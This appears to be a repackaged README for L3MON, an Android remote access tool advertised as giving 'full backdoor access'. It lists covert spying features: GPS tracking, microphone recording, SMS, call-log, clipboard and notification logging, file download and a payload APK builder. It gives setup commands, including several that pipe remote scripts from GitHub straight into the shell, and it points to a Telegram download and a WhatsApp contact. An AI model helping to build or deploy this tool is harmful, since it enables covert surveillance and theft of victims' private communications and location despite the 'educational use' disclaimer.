Tested in windows Os and digital ocean cloud server and it'working.
Video on youtube,Hack android and get full backdoor access and management :https://www.youtube.com/watch?v=VoqSMrKTLao
contant via whatsapp on :https://wa.me/message/FN4EPAOUM2VTJ1

A cloud-based remote Android management suite, powered by NodeJS

Now users no longer need to sign the L3mon payload using Apk Editor. If you are a Termux/Kali Linux user, you will be able to easily build the payload of Lemon with the help of this repository, as well as use it in Kali Linux and Ubuntu without any errors. If you are a Kali or Ubuntu user, you need to have Java8 Installed on your machine or follow the rootless installation.

The only way to help us is to visit our YouTube channel and subscribe to our channel, leave your comments on our videos, and follow us on GitHub. Looking forward to your cooperation.
L3MON(GTAG) Features

    GPS Logging
    Microphone Recording
    View Contacts
    SMS Logs
    Send SMS
    Call Logs
    View Installed Apps
    View Stub Permissions
    Live Clipboard Logging
    Live Notification Logging
    View WiFi Networks (logs previously seen)
    File Explorer & Downloader
    Command Queuing
    Built In APK Builder

Prerequisites

    Java Runtime Environment 8
        See installation for OS specifics
    NodeJs
    A Server

Installation

Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that don't use this will be closed WITHOUT a response)
        Debian, Ubuntu, Etc
        Ubuntu chroot
	
            sudo apt install wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre
	    
	    source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-kali-ubuntu.sh)
Termux
           
	    pkg update && pkg upgrade
            source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-termux.sh) 
            source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/L3mon-no-java8.sh) 
            curl -L -o $PWD/emsf https://github.com/efxtv/EMSF/blob/main/termux/emsf?raw=true -s;chmod +x emsf;mv emsf ../usr/bin/ 
Fedora, Oracle, Red Hat, etc

            su -c "yum install java-1.8.0-openjdk"
Windows
            click HERE:https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html for downloads

Install NodeJS Instructions Here:https://nodejs.org/en/download/package-manager/ (If you can't figure this out, you shouldn't be using this)

Install PM2

        npm install pm2 -g
        npm install
        npm audit fix
        npm audit
        npm audit fix --force

Download and Extract the latest release from HERE:https://t.me/etxtv

In the extracted folder, run these commands

        npm install <- install dependencies
        pm2 start index.js <-- start the script
        pm2 startup <- to run L3MON on startup

    Set a Username & Password
        Stop L3MON pm2 stop index
        Open maindb.json in a text editor
        MD5 Hash echo -n efxtv | openssl md5|awk '{print $2}'
        under admin
            set the username as plain text
            set the password as a LOWERCASE MD5 hash
        save the file
        run pm2 restart all

in your browser navigate to http://127.0.0.1:22533

Notes

When opening an issue, you MUST use the provided templates. Issues without this will not receive support quickly and will be put to the bottom of the figurative pile.

Please look through the current issues, open and closed to see if your issue has been addressed before. If it's java related, it's most definitely been addressed - In short Use Java 1.8.0
Screenshots
		
Call Log 	APK Builder 	Clipboard Log
Contacts 	Devices 	File Explorer
GPS Log 	SMS Log 	Send SMS
Installed Apps 	Microphone 	Notifications
Event Log 	Login 	WiFi Manager
Thanks

L3MON(GTAG) Builds off and utilizes several open-source software, Without these, L3MON Wouldn't be what it is!

Inspiration for the project and the basic building blocks for the Android App are based on AhMyth
some packages are included (node_modules)
    express
    node-geoip
    lowdb
    socket.io
    Open Street Map
    Leaflet

Disclaimer

D3VL Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.
L3MON(GTAG) is built for both Educational and Internal use ONLY.

Made with ❤️ By D3VL
edited and modified by ogaojohn

v1.1.2 Credit!
